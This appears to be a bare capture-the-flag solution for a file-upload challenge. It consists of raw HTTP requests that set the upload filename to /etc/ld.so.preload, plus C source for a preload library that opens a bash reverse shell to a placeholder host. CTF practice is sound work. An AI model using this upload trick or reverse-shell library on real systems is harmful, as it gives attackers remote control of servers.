---
tags: [文件上传, 条件竞争, RCE]
---

# filechecker_pro_max

```
POST / HTTP/1.1
Host: 140.210.199.170:33003
Content-Length: 16483
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://140.210.199.170:33003
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeAFpUSrNdxDl3ygh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://140.210.199.170:33003/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryeAFpUSrNdxDl3ygh
Content-Disposition: form-data; name="file-upload"; filename="/etc/ld.so.preload"
Content-Type: application/octet-stream

•ELF...

/etc/ld.so.preload
------WebKitFormBoundaryeAFpUSrNdxDl3ygh--
```

条件竞争

```
POST / HTTP/1.1
Host: 140.210.199.170:33001
Content-Length: 226
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://159.138.110.192:23001
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7zVyLduPekriMlgg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/108.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://159.138.110.192:23001/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary7zVyLduPekriMlgg
Content-Disposition: form-data; name="file-upload"; filename="/etc/ld.so.preload"
Content-Type: application/octet-stream

/tmp/poc.so
------WebKitFormBoundary7zVyLduPekriMlgg--
```

poc.so:

```
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
system("bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'");
}
char*  getenv(const char *__name) {
unsetenv("LD_PRELOAD");
payload();
}
```

